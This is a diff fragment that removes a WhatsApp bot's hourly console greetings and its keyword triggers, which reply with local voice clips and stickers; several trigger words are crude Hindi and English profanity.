-          console.log(color('[Bot Message]', 'cyan'), color('Subscribe Xeon', 'yellow'), color('(🙄)', 'white'))
-          }
-          if (hour_now >= '12:00' && hour_now <= '14:00') {
-           console.log(color('[Bot Message]', 'cyan'), color('Subscribe Xeon', 'yellow'), color('(😊)', 'white'))
-           }
-        if (hour_now >= '14:00' && hour_now <= '15:00') {
-          console.log(color('[Bot Message]', 'cyan'), color('Subscribe Xeon', 'yellow'), color('(😅)', 'white'))
-          }
-        if (hour_now >= '15:00' && hour_now <= '16:00') {
-          console.log(color('[Bot Message]', 'cyan'), color('Subscribe Xeon', 'yellow'), color('(😊)', 'white'))
-          }
-        if (hour_now >= '17:00' && hour_now <= '18:00') {
-          console.log(color('[Bot Message]', 'cyan'), color('Subscribe Xeon', 'yellow'), color('(😆)', 'white'))
-          }
-        if (hour_now >= '18:00' && hour_now <= '19:00') {
-        	console.log(color('[Bot Message]', 'cyan'), color('Subscribe Xeon', 'yellow'), color('(😊)', 'white'))
-        }
-        if (hour_now >= '19:00' && hour_now <= '20:00') {
-           console.log(color('[Bot Message]', 'cyan'), color('Subscribe Xeon', 'yellow'), color('(😊)', 'white'))
-           }
-        if (hour_now >= '20:00' && hour_now <= '00:00') {
-           console.log(color('[Bot Message]', 'cyan'), color('Subscribe Xeon', 'yellow'), color('(😄)', 'white'))
-        }
-          if (hour_now >= '00:00' && hour_now <= '02:00') {
-           console.log(color('[Bot Message]', 'cyan'), color('Subscribe Xeon', 'yellow'), color('(😴)', 'white'))
-        }
-
-if (budy.includes(`Wah`)) {
-const Peli = fs.readFileSync('./voicesticker/wah.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`wah`)) {
-const Peli = fs.readFileSync('./voicesticker/wah.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`sikha`)) {
-const Peli = fs.readFileSync('./voicesticker/sikha.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Sikha`)) {
-const Peli = fs.readFileSync('./voicesticker/sikha.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`selmon`)) {
-const Peli = fs.readFileSync('./voicesticker/selmon.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Selmon`)) {
-const Peli = fs.readFileSync('./voicesticker/selmon.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Pardesi`)) {
-const Peli = fs.readFileSync('./voicesticker/pardesi.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`pardesi`)) {
-const Peli = fs.readFileSync('./voicesticker/pardesi.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`ohhh`)) {
-const Peli = fs.readFileSync('./voicesticker/ohhh.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Ohhh`)) {
-const Peli = fs.readFileSync('./voicesticker/ohhh.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`nikal`)) {
-const Peli = fs.readFileSync('./voicesticker/nikal.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Nikal`)) {
-const Peli = fs.readFileSync('./voicesticker/nikal.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`moj`)) {
-const Peli = fs.readFileSync('./voicesticker/moj.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Moj`)) {
-const Peli = fs.readFileSync('./voicesticker/moj.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Marry`)) {
-const Peli = fs.readFileSync('./voicesticker/marriage.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`marry`)) {
-const Peli = fs.readFileSync('./voicesticker/marriage.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`madarchod`)) {
-const Peli = fs.readFileSync('./voicesticker/madarchod.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Madarchod`)) {
-const Peli = fs.readFileSync('./voicesticker/madarchod.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Lmao`)) {
-const Peli = fs.readFileSync('./voicesticker/lmao.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`lmao`)) {
-const Peli = fs.readFileSync('./voicesticker/lmao.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`horny`)) {
-const Peli = fs.readFileSync('./voicesticker/horny.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Horny`)) {
-const Peli = fs.readFileSync('./voicesticker/horny.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`hmm`)) {
-const Peli = fs.readFileSync('./voicesticker/hmm.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Hmm`)) {
-const Peli = fs.readFileSync('./voicesticker/hmm.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`muth`)) {
-const Peli = fs.readFileSync('./voicesticker/hila.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Muth`)) {
-const Peli = fs.readFileSync('./voicesticker/hila.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`hasi`)) {
-const Peli = fs.readFileSync('./voicesticker/haha.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Hasi`)) {
-const Peli = fs.readFileSync('./voicesticker/haha.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`gulambi`)) {
-const Peli = fs.readFileSync('./voicesticker/gulabi.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Gulambi`)) {
-const Peli = fs.readFileSync('./voicesticker/gulabi.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`gadbad`)) {
-const Peli = fs.readFileSync('./voicesticker/gadbad.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Gadbad`)) {
-const Peli = fs.readFileSync('./voicesticker/gadbad.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`dhoka`)) {
-const Peli = fs.readFileSync('./voicesticker/dhoka.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Dhoka`)) {
-const Peli = fs.readFileSync('./voicesticker/dhoka.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`chacha`)) {
-const Peli = fs.readFileSync('./voicesticker/chacha.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Chacha`)) {
-const Peli = fs.readFileSync('./voicesticker/chacha.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`bhoot`)) {
-const Peli = fs.readFileSync('./voicesticker/bhoot.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Bhoot`)) {
-const Peli = fs.readFileSync('./voicesticker/bhoot.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`bhadwe`)) {
-const Peli = fs.readFileSync('./voicesticker/bhadwe.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Bhadwe`)) {
-const Peli = fs.readFileSync('./voicesticker/bhadwe.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Beizzat`)) {
-const Peli = fs.readFileSync('./voicesticker/beizzat.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`beizzat`)) {
-const Peli = fs.readFileSync('./voicesticker/beizzat.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`bass`)) {
-const Peli = fs.readFileSync('./voicesticker/bass.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Bass`)) {
-const Peli = fs.readFileSync('./voicesticker/bass.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Awesome`)) {
-const Peli = fs.readFileSync('./voicesticker/awesome.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`awesome`)) {
-const Peli = fs.readFileSync('./voicesticker/awesome.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`arey`)) {
-const Peli = fs.readFileSync('./voicesticker/arey.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Arey`)) {
-const Peli = fs.readFileSync('./voicesticker/arey.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`alvida`)) {
-const Peli = fs.readFileSync('./voicesticker/Alvida.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Alvida`)) {
-const Peli = fs.readFileSync('./voicesticker/Alvida.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Done`)) {
-const Peli = fs.readFileSync('./voicesticker/done.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`done`)) {
-const Peli = fs.readFileSync('./voicesticker/done.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`gaya`)) {
-const Peli = fs.readFileSync('./voicesticker/gaya.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Gaya`)) {
-const Peli = fs.readFileSync('./voicesticker/gaya.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Khatam`)) {
-const Peli = fs.readFileSync('./voicesticker/gaya.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`khatam`)) {
-const Peli = fs.readFileSync('./voicesticker/gaya.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`life`)) {
-const Peli = fs.readFileSync('./voicesticker/life.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Life`)) {
-const Peli = fs.readFileSync('./voicesticker/life.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`lol`)) {
-const Peli = fs.readFileSync('./voicesticker/lol.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Lol`)) {
-const Peli = fs.readFileSync('./voicesticker/lol.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`sad`)) {
-const Peli = fs.readFileSync('./voicesticker/sad.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Sad`)) {
-const Peli = fs.readFileSync('./voicesticker/sad.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`funny`)) {
-const Peli = fs.readFileSync('./voicesticker/fullcomedy.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Funny`)) {
-const Peli = fs.readFileSync('./voicesticker/fullcomedy.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`hi`)) {
-const Peli = fs.readFileSync('./voicesticker/hi.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Hi`)) {
-const Peli = fs.readFileSync('./voicesticker/hi.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`hello`)) {
-const Peli = fs.readFileSync('./voicesticker/hello.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Hello`)) {
-const Peli = fs.readFileSync('./voicesticker/hello.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`afternoon`)) {
-const Peli = fs.readFileSync('./voicesticker/afternoon.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Afternoon`)) {
-const Peli = fs.readFileSync('./voicesticker/afternoon.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`night`)) {
-const Peli = fs.readFileSync('./voicesticker/night.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Night`)) {
-const Peli = fs.readFileSync('./voicesticker/night.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Thanks`)) {
-const Peli = fs.readFileSync('./voicesticker/thanks.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`thanks`)) {
-const Peli = fs.readFileSync('./voicesticker/thanks.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`tq`)) {
-const Peli = fs.readFileSync('./voicesticker/thanks.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Tq`)) {
-const Peli = fs.readFileSync('./voicesticker/thanks.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`chapri`)) {
-const Peli = fs.readFileSync('./voicesticker/q re chapri.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Chapri`)) {
-const Peli = fs.readFileSync('./voicesticker/q re chapri.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Morning`)) {
-const Peli = fs.readFileSync('./voicesticker/good morning.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`morning`)) {
-const Peli = fs.readFileSync('./voicesticker/good morning.mp3');
-itsmevall.sendMessage(from, Peli, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-}
-if (budy.includes(`Vidhayak`)) {
-const Peli = fs.readFileSync('./voicesticker/vidhayak.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`vidhayak`)) {
-const Peli = fs.readFileSync('./voicesticker/vidhayak.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`hear`)) {
-const Peli = fs.readFileSync('./voicesticker/ok.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Hear`)) {
-const Peli = fs.readFileSync('./voicesticker/ok.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`karo`)) {
-const Peli = fs.readFileSync('./voicesticker/karo.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Karo`)) {
-const Peli = fs.readFileSync('./voicesticker/karo.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`love`)) {
-const Peli = fs.readFileSync('./voicesticker/love.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Love`)) {
-const Peli = fs.readFileSync('./voicesticker/love.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`nice`)) {
-const Peli = fs.readFileSync('./voicesticker/nice.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Nice`)) {
-const Peli = fs.readFileSync('./voicesticker/nice.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`smile`)) {
-const Peli = fs.readFileSync('./voicesticker/smile.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Smile`)) {
-const Peli = fs.readFileSync('./voicesticker/smile.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`ahh`)) {
-const Peli = fs.readFileSync('./voicesticker/ahh.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Ahh`)) {
-const Peli = fs.readFileSync('./voicesticker/ahh.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Fk`)) {
-const Peli = fs.readFileSync('./voicesticker/f.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`fk`)) {
-const Peli = fs.readFileSync('./voicesticker/f.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Fuck`)) {
-const Peli = fs.readFileSync('./voicesticker/f.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Fck`)) {
-const Peli = fs.readFileSync('./voicesticker/f.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`fuck`)) {
-const Peli = fs.readFileSync('./voicesticker/f.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`fck`)) {
-const Peli = fs.readFileSync('./voicesticker/f.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`datte`)) {
-const Peli = fs.readFileSync('./voicesticker/datte.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Datte`)) {
-const Peli = fs.readFileSync('./voicesticker/datte.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`sed`)) {
-const Peli = fs.readFileSync('./voicesticker/sed.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Sed`)) {
-const Peli = fs.readFileSync('./voicesticker/sed.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`mikey`)) {
-const Peli = fs.readFileSync('./voicesticker/mikey.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Mikey`)) {
-const Peli = fs.readFileSync('./voicesticker/mikey.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`cute`)) {
-const Peli = fs.readFileSync('./voicesticker/cute.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Cute`)) {
-const Peli = fs.readFileSync('./voicesticker/cute.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Cutie`)) {
-const Peli = fs.readFileSync('./voicesticker/cute.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`cutie`)) {
-const Peli = fs.readFileSync('./voicesticker/cute.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`sing`)) {
-const Peli = fs.readFileSync('./voicesticker/sing.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Sing`)) {
-const Peli = fs.readFileSync('./voicesticker/sing.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`ok`)) {
-const Peli = fs.readFileSync('./voicesticker/okay.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Ok`)) {
-const Peli = fs.readFileSync('./voicesticker/okay.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Chut`)) {
-const Peli = fs.readFileSync('./voicesticker/chut.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`chut`)) {
-const Peli = fs.readFileSync('./voicesticker/chut.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`sex`)) {
-const Peli = fs.readFileSync('./voicesticker/sex.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Sex`)) {
-const Peli = fs.readFileSync('./voicesticker/sex.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`bacche`)) {
-const Peli = fs.readFileSync('./voicesticker/baccha.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Bacche`)) {
-const Peli = fs.readFileSync('./voicesticker/baccha.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`baccha`)) {
-const Peli = fs.readFileSync('./voicesticker/baccha.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Baccha`)) {
-const Peli = fs.readFileSync('./voicesticker/baccha.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`gandu`)) {
-const Peli = fs.readFileSync('./voicesticker/gussa.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Gandu`)) {
-const Peli = fs.readFileSync('./voicesticker/gussa.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`randi`)) {
-const Peli = fs.readFileSync('./voicesticker/randi.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Randi`)) {
-const Peli = fs.readFileSync('./voicesticker/randi.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Breakup`)) {
-const Peli = fs.readFileSync('./voicesticker/breakup.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`breakup`)) {
-const Peli = fs.readFileSync('./voicesticker/breakup.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`ded`)) {
-const Peli = fs.readFileSync('./voicesticker/ded.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Ded`)) {
-const Peli = fs.readFileSync('./voicesticker/ded.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`angry`)) {
-const Peli = fs.readFileSync('./voicesticker/angry.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Angry`)) {
-const Peli = fs.readFileSync('./voicesticker/angry.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`pain`)) {
-const Peli = fs.readFileSync('./voicesticker/pain.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Pain`)) {
-const Peli = fs.readFileSync('./voicesticker/pain.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`lie`)) {
-const Peli = fs.readFileSync('./voicesticker/lie.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Lie`)) {
-const Peli = fs.readFileSync('./voicesticker/lie.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`sorry`)) {
-const Peli = fs.readFileSync('./voicesticker/sorry.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Sorry`)) {
-const Peli = fs.readFileSync('./voicesticker/sorry.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Wtf`)) {
-const Peli = fs.readFileSync('./voicesticker/wtf.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`wtf`)) {
-const Peli = fs.readFileSync('./voicesticker/wtf.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`money`)) {
-const Peli = fs.readFileSync('./voicesticker/money.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Money`)) {
-const Peli = fs.readFileSync('./voicesticker/money.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`luv`)) {
-const Peli = fs.readFileSync('./voicesticker/luv.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
-if (budy.includes(`Luv`)) {
-const Peli = fs.readFileSync('./voicesticker/luv.webp');
-itsmevall.sendMessage(from, Peli, MessageType.sticker, {quoted: mek})
-}
